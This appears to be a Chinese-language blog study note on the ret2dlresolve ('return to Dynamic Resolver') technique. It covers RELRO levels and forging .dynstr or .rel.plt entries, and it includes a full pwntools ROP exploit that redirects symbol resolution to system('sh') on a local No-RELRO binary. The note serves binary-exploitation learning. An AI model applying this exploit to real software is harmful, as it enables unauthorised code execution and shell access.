---
layout: post
title: return to Dynamic Resolver
excerpt: "return to Dynamic Resolver"
categories: [未完待续]
comments: true
---

#### return to Dynamic Resolver
不需要leak information和libc版本


RELRO:Relocation Read Only
- No RELRO : 所有相关的data structure几乎都能写
- Partial RELRO : .dynamic 、.dynsym、.dynstr等只能读(这个是gcc默认值)
- Full RELRO：所有的symbol载入时解析已经完成，GOT只读，没有link_map和resolver的指标

##### Leakless基本要求
- 非Full ASLR，probgram本身的memory layout要已知
- 通常有information leak时，使用DynELF会比较方便

#### No RELRO
伪造.dynstr
- readelf找出.dynamic中DT_STRTAB的位置,并改变它的值
- 把原本的.dynstr指向一个可控制的buffer,在buffer上放system的字串
- 跳一个还没有resolver过的symbol

伪造`.rel.plt`的enrty 
- 传一个特大的reloc_arg进去,使得.rel.plt+relog_arg落在可控的记忆体上
- .dynstr + st_name处放上'system\0'

ld的修改可以`vim a.out`,然后该其中的ld

通过`readelf -a no | less`查看到STRTAB是Dynamic的从零起第八个
```
Dynamic section at offset 0x604 contains 24 entries:
  标记        类型                         名称/值
 0x00000001 (NEEDED)                     共享库：[libc.so.6]
 0x0000000c (INIT)                       0x80482b4
 0x0000000d (FINI)                       0x80484e4
 0x00000019 (INIT_ARRAY)                 0x80495f8
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x80495fc
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x804818c
 0x00000005 (STRTAB)                     0x804820c

```

memcpy结构
```
----------------
memcpy          |	原本的return addr
----------------|
new return addr |
----------------|
arg 1           |
----------------|
arg 2           |
----------------|
arg 3           |
----------------|

```

norelo最终代码(伪造.dynstr)
```python
from pwn import *

context.arch='i386'
r = process('./no')

# no ver
read = 0x80482f0        #objdump -d no | grep read
memcpy = 0x8048300      #objdump -d no | grep memcpy
plt0 = 0x80482e0
pop3 = 0x80484d9
pop2 = 0x80484da
pop1 = 0x80484db
gmon = 0x08048310       #08048310 <__gmon_start__@plt>

buf = 0x8049740         #gdb-peda$ p &buf
d = buf + 2048

dynamic = 0x08049604        #readelf -a no | grep dynamic
dynamic_dynstr = dynamic + 8 * 8        #dynamic中的第八个指向的是dynamic_dynstr

rop = flat(
    memcpy, pop3, dynamic_dynstr + 4, d + 0, 4,     #这个就是从d这里开始memcpy 4个byte,到dynamic_dynstr + 4,其中memcpy这个是return address
    gmon, 0xdeadbeef, d + 12                        #跳到__gmon_start__这个没有调用过的function,0xdeadbeef为call完之后的return address
    )

data = flat(
    d + 4 - 56,  # d+4
    'system\x00\x00' # d+12
    'sh\x00'                                    #这个就是system的参数
    )

raw_input('@')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)

r.interactive()
```